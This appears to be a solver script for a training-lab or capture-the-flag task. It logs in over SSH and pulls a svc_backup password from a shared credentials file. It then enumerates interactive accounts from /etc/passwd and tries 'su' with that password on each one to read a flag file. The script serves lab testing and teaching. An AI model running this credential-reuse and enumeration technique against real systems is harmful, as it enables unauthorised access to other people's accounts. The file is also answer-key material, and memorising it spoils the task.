"""Intended-path solver: recovered password, account enumeration, su reuse."""

import re
import time
import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

CREDS_RE = re.compile(r"svc_backup\s*:\s*(\S+)")
INTERACTIVE_RE = re.compile(
    r"^[a-z_][a-z0-9_-]*:[^:]*:\d+:\d*:[^:]*:(/[^:]+):(?:(?!nologin|false)\S+)$"
)


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def _connect(host: str, port: int) -> paramiko.SSHClient:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    return client


def _run(client: paramiko.SSHClient, cmd: str, timeout: int = 20) -> str:
    _, stdout, _stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode(errors="replace")


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    detail = None
    captured = None
    client = _connect(host, port)
    try:
        note = _run(client, "cat /home/learner/shared-creds.txt")
        match = CREDS_RE.search(note)
        if match is None:
            detail = "no svc_backup credential found in the handoff note"
            return SolveResult(results=[TaskResult(task_id="reuse-chain", ok=False, detail=detail)])
        password = match.group(1)

        passwd = _run(client, "cat /etc/passwd")
        candidates = [
            line.split(":")[0] for line in passwd.splitlines() if INTERACTIVE_RE.match(line)
        ]
        candidates = [name for name in candidates if name not in ("learner", "root")]

        channel = client.invoke_shell()

        def _wait_for(buf: str, pattern: "re.Pattern[str]", seconds: float) -> str:
            end = time.time() + seconds
            while time.time() < end:
                if pattern.search(buf):
                    return buf
                if channel.recv_ready():
                    buf += channel.recv(4096).decode(errors="replace")
                else:
                    time.sleep(0.1)
            return buf

        def _drain() -> None:
            end = time.time() + 1.5
            while time.time() < end:
                if channel.recv_ready():
                    channel.recv(4096)
                    end = time.time() + 0.5
                else:
                    time.sleep(0.1)

        _drain()

        for name in candidates:
            channel.sendall(
                f"su - {name} -c 'cat /var/archives/flag.txt'; echo MARKER_$?\n".encode()
            )
            buffer = _wait_for("", re.compile(r"[Pp]assword\s*:"), 5)
            if re.search(r"[Pp]assword\s*:", buffer):
                channel.sendall((password + "\n").encode())
            buffer = _wait_for(buffer, re.compile(r"MARKER_\d"), 12)
            flags = find_flags(buffer)
            if flags:
                captured = flags[-1]
                detail = f"reuse worked: {password} opened the {name} session"
                break
            detail = f"{password} did not open the {name} session"

        channel.close()
    finally:
        client.close()

    return SolveResult(
        results=[
            TaskResult(
                task_id="reuse-chain",
                ok=captured is not None,
                captured=captured,
                detail=detail if captured is None else f"{detail}; flag captured",
            )
        ]
    )
